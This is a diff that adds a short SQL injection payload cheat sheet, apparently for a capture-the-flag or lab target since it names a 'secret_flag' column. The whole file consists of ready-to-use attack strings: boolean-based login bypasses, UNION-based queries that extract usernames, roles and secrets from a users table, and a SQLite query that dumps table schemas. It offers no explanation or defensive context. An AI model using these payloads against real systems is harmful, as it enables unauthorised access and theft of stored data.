@@ -1,0 +1,15 @@
+# CHEAT SHEET PAYLOAD SQL INJECTION (SQLi)
+
+1. Authentication & Search Bypass (Boolean-Based):
+   ' OR 1=1 --
+   admin' --
+   ' OR '1'='1
+   ' OR ''='
+
+2. UNION-Based Data Extraction:
+   ' UNION SELECT 1, 2, 3, 4 --
+   ' UNION SELECT id, username, role, secret_flag FROM users --
+   ' UNION SELECT id, name, price, category FROM products --
+
+3. SQLite Specific Metadata:
+   ' UNION SELECT 1, tbl_name, sql, 4 FROM sqlite_master WHERE type='table' --
